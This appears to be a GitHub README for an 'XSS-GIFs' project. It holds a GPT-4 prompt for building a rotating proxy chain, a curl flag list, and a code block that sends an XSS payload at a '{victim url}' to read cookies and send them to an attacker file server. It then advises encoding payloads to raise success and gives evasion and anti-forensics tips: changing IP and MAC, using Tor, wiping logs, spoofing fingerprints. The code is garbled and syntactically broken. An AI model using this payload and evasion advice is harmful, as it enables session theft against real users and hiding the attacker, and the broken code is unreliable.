# XSS-GIFs
XSS injection into GIFs

This peace is promptengineered with gpt-4.
I spent a lot of time to develope the right prompts!!!
Here is a example prompt:
Please use the .pac structure from the file inkognito.pac. Configure the Debian NetworkManager to use this .pac. To get the list of proxies, use the program www.github.com/N3S3/INKOGNITO. The functional logic is in modified_main.py. Output is a list of tested proxies which you can transfer to the proxy list of proxies in inkognito.pac.  Store inkognito.pac in the folder /tmp/ but have always a template under /home/user/ backuped. Task is to have a program which generates a output of a bunch  working proxy addresses(INKOGNITO does this), this is stored in a pac file which rotates the ips every 1 minute. This in a proxy chain of 3 server. Place that in autorun and start the whole process every 1 hour(get a proxy list --> store in /tmp/inkognito.pac for the DebianNetworkManager and make it randomly rotate: 1st the 3 server chain (every 5 minutes) and the proxy list(every 1hour). Do not forget the backup of the native incognito.pac in /root. If you have questions feel free to ask. Dont break the code!!! Use a very high correctness and run unit tests. Good luck!!!   

![Screenshot 1](https://github.com/N3S3/XSS-GIFs/assets/68975029/c1cb3f2a-b59c-4d54-88b4-5cbd345eecab)


With code examples to use. You can turn on your burp suite and decode stuff with the decoder or install the framework rizin which has the advatage that it can be integrated into a python script. I also suggest to read the manual of curl (/usr/bin/bash man curl) to know some flags like -i -A, -X or -T which are pretty straight forward e.g.:

curl [options...] <url>
 -d, --data <data>          HTTP POST data
 -f, --fail                 Fail fast with no output on HTTP errors
 -h, --help <category>      Get help for commands
 -i, --include              Include protocol response headers in the output
 -o, --output <file>        Write to file instead of stdout
 -O, --remote-name          Write output to a file named as the remote file
 -s, --silent               Silent mode
 -T, --upload-file <file>   Transfer local FILE to destination
 -u, --user <user:password> Server user and password
 -A, --user-agent <name>    Send User-Agent <name> to server
 -v, --verbose              Make the operation more talkative
 -V, --version              Show version number and quit

<code>
$ touch /tmp/response.txt

http-header = $'GET' \ -H $'Host: yandex.com' -H $'User-Agent: 'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)', -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', -H $'Accept-Language: en;q=0.5, ru', -H $'Accept-Encoding: gzip, deflate', -H $'Referer: Http://baidu.cn', -H $'Connection: close', -H $'Upgrade-Insecure-Requests: 1', \-b $'session=', \$'https://yandex.com/bots?q='&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;p=d.write(\"d.coockie\");new img:src='your_file-server/'+p;&lt;/STYLE&gt'

$ ../bin/bash/curl f'-o response.txt -i -s -k -X '+{http-header}+' '+{victim url}'

</code>
Feel free to encode this into url_base64, hex, bin, char etc. . It increases your chances for success. Do not forget to change your IP for example with github/N3S3/INKOGNITO, change your mac, use Tor-Browser or Libre Wolf as standard Browser and clean afterwards up with bleachbit (coockies + cache + logs) in overwrite mode on ssd. Hdd means 32xpeter-guthmann-method..thats not good for the lifecycle of your disk ;).Do not use ipv6, because of duid. Consider also spoofing of your uuid, canvas gps geolocation(location-guard add) and much more!!!! For questions and construtive critic: n3s3@myyahoo.com.
![Screenshot 2](https://github.com/N3S3/XSS-GIFs/assets/68975029/1e9c839a-5d7f-44ab-a7c1-4c4b10e5429f)



